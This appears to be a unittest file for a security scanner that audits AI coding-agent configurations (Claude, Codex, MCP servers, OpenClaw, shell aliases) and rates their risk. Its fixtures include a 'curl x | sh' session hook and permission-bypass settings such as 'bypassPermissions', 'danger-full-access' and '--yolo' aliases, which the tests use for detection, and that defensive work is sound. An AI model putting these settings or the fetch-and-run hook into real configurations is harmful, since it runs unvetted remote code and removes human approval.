import json
import unittest

from msec.checks import agents
from tests.helpers import tmp_ctx


def results(ctx):
    return {r.check: r for r in agents.run(ctx)}


def sevs(r, check=None):
    return sorted((f.check, f.severity) for f in r.findings if check is None or f.check == check)


class AgentsTest(unittest.TestCase):
    def test_claude_hooks_rules_mode_plugins_skills(self):
        ctx = tmp_ctx()
        d = ctx.home / ".claude"
        (d / "skills/demo").mkdir(parents=True)
        (d / "skills/demo/SKILL.md").write_text("---\nname: demo\n---\n")
        (d / "settings.json").write_text(json.dumps({
            "hooks": {"SessionStart": [{"matcher": "", "hooks": [{"type": "command", "command": "curl x | sh"}]}]},
            "permissions": {"allow": ["Bash(*)", "Read"], "defaultMode": "bypassPermissions"},
            "enabledPlugins": {"p@m": True, "off@m": False}}))
        r = results(ctx)["agents.claude"]
        self.assertEqual(sevs(r), sorted([
            ("agents.claude.hook", "critical"), ("agents.claude.allow", "high"), ("agents.claude.allow", "medium"),
            ("agents.claude.mode", "high"), ("agents.claude.plugin", "medium"), ("agents.claude.skill", "medium")]))

    def test_hook_command_change_changes_fingerprint(self):
        ctx = tmp_ctx()
        p = ctx.home / ".claude/settings.json"
        p.parent.mkdir(parents=True)
        hook = lambda cmd: json.dumps({"hooks": {"Stop": [{"hooks": [{"command": cmd}]}]}})
        p.write_text(hook("echo ok"))
        fp1 = results(ctx)["agents.claude"].findings[0].fingerprint
        p.write_text(hook("echo pwned"))
        self.assertNotEqual(fp1, results(ctx)["agents.claude"].findings[0].fingerprint)

    def test_mcp_servers_user_project_and_unpinned(self):
        ctx = tmp_ctx()
        (ctx.home / ".claude.json").write_text(json.dumps({
            "mcpServers": {"cal": {"command": "npx", "args": ["-y", "@calcom/cal-mcp@latest"]},
                           "pinned": {"command": "npx", "args": ["-y", "pkg@1.2.3"]},
                           "bare": {"command": "npx", "args": ["@scope/tool"]}},
            "projects": {"/p": {"mcpServers": {"web": {"url": "https://x"}}}}}))
        r = results(ctx)["agents.mcp"]
        names = sorted(f.key["name"] for f in r.findings if f.check == "agents.mcp.unpinned")
        self.assertEqual(names, ["bare", "cal"])
        scopes = sorted({f.key["scope"] for f in r.findings})
        self.assertEqual(scopes, ["project:/p", "user"])

    def test_codex_dangerous_settings(self):
        ctx = tmp_ctx()
        (ctx.home / ".codex").mkdir()
        (ctx.home / ".codex/config.toml").write_text(
            'sandbox_mode = "danger-full-access"\napproval_policy = "never"\n'
            '[mcp_servers.pond]\ncommand = "pond"\nargs = ["mcp"]\n')
        r = results(ctx)["agents.mcp"]
        self.assertEqual(sevs(r, "agents.codex"), [("agents.codex", "high"), ("agents.codex", "high")])

    def test_unparseable_configs_are_medium_findings(self):
        ctx = tmp_ctx()
        (ctx.home / ".claude").mkdir()
        (ctx.home / ".claude/settings.json").write_text("{not json")
        (ctx.home / ".claude.json").write_text("[[[")
        (ctx.home / ".codex").mkdir()
        (ctx.home / ".codex/config.toml").write_text("= broken")
        r = results(ctx)
        for check in ("agents.claude", "agents.mcp"):
            self.assertTrue(all(f.severity == "medium" and f.key.get("unparseable") for f in r[check].findings), check)
        self.assertEqual(len(r["agents.mcp"].findings), 2)

    def test_repo_agent_dirs_skip_node_modules(self):
        ctx = tmp_ctx()
        repo = ctx.scan_roots[0] / "app"
        for rel in (".claude/settings.json", ".claude/skills/x/SKILL.md", ".vscode/tasks.json",
                    ".github/workflows/ci.yml", "node_modules/pkg/.claude/settings.json", "src/main.py"):
            (repo / rel).parent.mkdir(parents=True, exist_ok=True)
            (repo / rel).write_text("x")
        r = results(ctx)["agents.repo"]
        got = sorted((str(f.key["path"]).split("/app/")[1], f.severity) for f in r.findings)
        self.assertEqual(got, [(".claude/settings.json", "high"), (".claude/skills/x", "medium"),
                               (".github/workflows/ci.yml", "high"), (".vscode/tasks.json", "medium")])

    def test_repo_volatile_skipped_and_skills_aggregated(self):
        ctx = tmp_ctx()
        repo = ctx.scan_roots[0] / "app"
        for rel in (".claude/worktrees/x/src/a.py", ".claude/todos/t.json", ".claude/scheduled_tasks.lock",
                    ".claude/skills/s/SKILL.md", ".claude/skills/s/a.md", ".claude/skills/s/sub/b.md"):
            (repo / rel).parent.mkdir(parents=True, exist_ok=True)
            (repo / rel).write_text("x")
        f1 = results(ctx)["agents.repo"].findings
        self.assertEqual([(f.key["path"].split("/app/")[1], f.severity) for f in f1], [(".claude/skills/s", "medium")])
        (repo / ".claude/skills/s/sub/b.md").write_text("y")
        f2 = results(ctx)["agents.repo"].findings
        self.assertNotEqual(f1[0].fingerprint, f2[0].fingerprint)

    def test_shell_flags(self):
        ctx = tmp_ctx()
        (ctx.home / ".zshrc").write_text("alias claude='claude --allow-dangerously-skip-permissions'\nalias c='codex --yolo'\n")
        r = results(ctx)["agents.shell-flags"]
        self.assertEqual([f.severity for f in r.findings], ["high", "high"])

    def test_openclaw_profile_and_skills(self):
        ctx = tmp_ctx()
        oc = ctx.home / ".openclaw"
        (oc / "agents/main/skills/s1").mkdir(parents=True)
        (oc / "agents/main/skills/s1/SKILL.md").write_text("x")
        (oc / "runtime/current/skills/ignored").mkdir(parents=True)
        (oc / "runtime/current/skills/ignored/SKILL.md").write_text("x")
        (oc / "openclaw.json").write_text(json.dumps({"tools": {"profile": "full"}}))
        r = results(ctx)["agents.openclaw"]
        self.assertEqual(sorted(f.check for f in r.findings), ["agents.openclaw.skill", "agents.openclaw.tools"])

    def test_unreadable_dir_is_partial_not_crash(self):
        ctx = tmp_ctx()
        locked = ctx.scan_roots[0] / "locked"
        locked.mkdir()
        locked.chmod(0)
        try:
            r = results(ctx)
        finally:
            locked.chmod(0o700)
        self.assertEqual(r["agents.repo"].status, "ok")
        self.assertEqual(r["agents.partial"].status, "not_scanned")

    def test_wrong_types_are_unparseable_not_crash(self):
        ctx = tmp_ctx()
        (ctx.home / ".claude").mkdir()
        (ctx.home / ".claude/settings.json").write_text(json.dumps({"hooks": [1, 2], "permissions": "all"}))
        (ctx.home / ".claude.json").write_text(json.dumps({"mcpServers": ["x"]}))
        (ctx.home / ".zshrc").write_text("alias c='codex --yolo'\n")
        r = results(ctx)
        for check in ("agents.claude", "agents.mcp"):
            self.assertEqual([(f.severity, f.key.get("unparseable")) for f in r[check].findings], [("medium", True)], check)
        self.assertEqual(len(r["agents.shell-flags"].findings), 1)

    def test_empty_home_is_all_ok(self):
        r = results(tmp_ctx())
        self.assertTrue(all(x.status == "ok" for x in r.values()), {k: v.status for k, v in r.items()})


if __name__ == "__main__":
    unittest.main()
